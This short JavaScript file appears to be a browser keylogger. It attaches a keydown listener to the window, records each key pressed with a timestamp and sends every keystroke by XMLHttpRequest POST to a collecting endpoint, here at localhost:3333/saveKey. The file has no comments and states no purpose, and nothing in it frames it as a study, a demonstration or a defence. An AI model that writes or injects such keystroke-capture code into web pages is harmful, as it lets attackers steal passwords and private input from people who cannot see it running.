const keysPressed = [];
const url = "http://localhost:3333/saveKey";

function handleKeyDown(e) {
    const key = e.key;
    saveKeyPressed(key);
    console.log(`[ ${keysPressed[keysPressed.length - 1].keyPressed} ]`);

}



window.addEventListener('keydown', handleKeyDown);


function saveKeyPressed(keyPressed) {

    const key = {
        keyPressed,
        date: new Date(),
    }

    keysPressed.push(key);


    postMethod(url, { keyPressed });
}


function postMethod(url, body) {
    const xhr = new XMLHttpRequest()
    xhr.open("POST", url, true)
    xhr.setRequestHeader("Content-type", "application/json");
    xhr.send(JSON.stringify({ key: body.keyPressed }));


}